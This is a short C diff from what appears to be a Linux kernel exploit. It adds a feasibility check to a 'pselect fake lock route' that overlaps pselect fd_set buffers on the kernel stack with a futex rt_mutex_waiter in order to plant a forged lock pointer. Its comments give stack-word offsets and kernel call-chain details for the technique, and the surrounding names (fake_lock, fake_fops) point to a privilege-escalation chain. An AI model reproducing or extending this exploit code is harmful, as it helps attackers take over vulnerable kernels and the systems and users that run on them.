@@ -167,7 +167,39 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   }
 }
 
+static int pselect_route_feasible(void) {
+  /* The fd_set buffer holds 3 * words_per_set qwords (global words 0..max).
+   * The waiter's lock field (word 13 in our 2..14 layout) must land inside
+   * the buffer, otherwise the kernel reads stale stack garbage as the
+   * rt_mutex_waiter->lock pointer and panics (freeze + auto-reboot).
+   *
+   * Kernels with a 3-layer pselect chain (via do_pselect) push the futex
+   * waiter far above the fd_set buffer; with nfds=320 the buffer is only
+   * 15 qwords, so shift must be <= 1 for lock (word 13) to fit. */
+  int shift = pselect_waiter_shift();
+  int wps = pselect_words_per_set();
+  int max_global = 3 * wps - 1;
+  int lock_global = shift + 13;
+  if (lock_global > max_global) {
+    pr_error(
+        "pselect route infeasible: shift=%d places waiter lock at global "
+        "word %d but fd_set buffer only covers 0..%d (nfds=%d, %d "
+        "words/set). This kernel likely has a 3-layer pselect call chain "
+        "(via do_pselect) whose extra stack frame pushes the futex waiter "
+        "above the fd_set buffer. The pselect fd_set overlap route cannot "
+        "work on this kernel; aborting to prevent kernel panic.\n",
+        shift, lock_global, max_global, PSELECT_ROUTE_NFDS, wps);
+    return 0;
+  }
+  return 1;
+}
+
 void do_pselect_fake_lock_route(void) {
+  if (!pselect_route_feasible()) {
+    cfi_last_step = 36;
+    cfi_last_errno = 0;
+    return;
+  }
   if (!page_base || !fake_lock || !fake_fops) {
     cfi_last_step = 30;
     cfi_last_errno = 0;
